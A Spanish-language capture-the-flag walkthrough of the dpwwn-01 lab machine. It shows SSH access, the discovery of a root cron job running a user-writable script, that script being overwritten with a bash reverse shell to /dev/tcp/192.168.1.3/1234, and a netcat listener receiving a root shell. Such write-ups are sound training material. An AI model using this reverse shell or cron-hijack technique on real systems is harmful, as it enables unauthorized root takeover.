# Attack Port [22](https://github.com/CiprianoBryan/CTF/blob/master/Puertos%20mas%20comunes.md):

### 1. ssh:
```
root@kali:~# ssh mistic@192.168.1.10
Last login: Fri Nov 29 02:33:26 2019


[mistic@dpwwn-01 ~]$
```

### 2. explore:
Encontramos un archivo.
```
[mistic@dpwwn-01 ~]$ cat logrot.sh 
#!/bin/bash
#
#LOGFILE="/var/tmp" SEMAPHORE="/var/tmp.semaphore"


while : ; do
  read line
  while [[ -f $SEMAPHORE ]]; do
    sleep 1s
  done
  printf "%s\n" "$line" >> $LOGFILE
done
```

### 3. crontab:
Investigando, vemos que el crontab (task scheduler), ejecuta el archivo que
habiamos encontrado (logrot.sh) con usuario root durante
cada dia de la semana, mes, día del mes, hora en el minuto 3.
```
[mistic@dpwwn-01 ~]$ cat /etc/crontab 
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root

# For details see man 4 crontabs

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name  command to be executed

*/3 *  * * *  root  /home/mistic/logrot.sh
```

## Escala de privilegios:
### 4. Reverse Shell:
Podemos ejecutar un reverse shell desde el usuario mistic, pero esto nos daría control
al usuario mistic el cual ya lo tenemos, pero podríamos tener el control de usuario root
por medio del archivo logrot ya que este es ejecutado por root desde el crontab.
```
[mistic@dpwwn-01 ~]$ echo "bash -i >& /dev/tcp/192.168.1.3/1234 0>&1" > logrot.sh
```

### 5. netcat:
Escuchamos desde nuestra maquina atacante por el puerto 1234, y recibimos el control 
del usuario root gracias al power shell ejecutado con usuario root.
```
root@kali:~# nc -nlvp 1234
listening on [any] 1234 ...
connect to [192.168.1.3] from (UNKNOWN) [192.168.1.10] 35822
bash: no job control in this shell
[root@dpwwn-01 ~]#
```

### 6. explore:
```
[root@dpwwn-01 ~]# ls -la
ls -la
total 32
dr-xr-x---.  2 root root  182 Aug  1 15:16 .
dr-xr-xr-x. 17 root root  211 Aug  1 14:11 ..
-rw-------.  1 root root 1394 Aug  1 14:12 anaconda-ks.cfg
-rw-------.  1 root root   49 Nov 30 03:15 .bash_history
-rw-r--r--.  1 root root   18 Dec 28  2013 .bash_logout
-rw-r--r--.  1 root root  176 Dec 28  2013 .bash_profile
-rw-r--r--.  1 root root  176 Dec 28  2013 .bashrc
-rw-r--r--.  1 root root  100 Dec 28  2013 .cshrc
-r-x------.  1 root root  171 Aug  1 15:16 dpwwn-01-FLAG.txt
-rw-------.  1 root root    0 Aug  1 14:32 .mysql_history
-rw-r--r--.  1 root root  129 Dec 28  2013 .tcshrc
```

### 7. CTF:
```
[root@dpwwn-01 ~]# cat dpwwn-01-FLAG.txt
cat dpwwn-01-FLAG.txt

Congratulation! I knew you can pwn it as this very easy challenge. 

Thank you. 


64445777
6e643634 
37303737 
37373665 
36347077 
776e6450 
4077246e
33373336 
36359090
```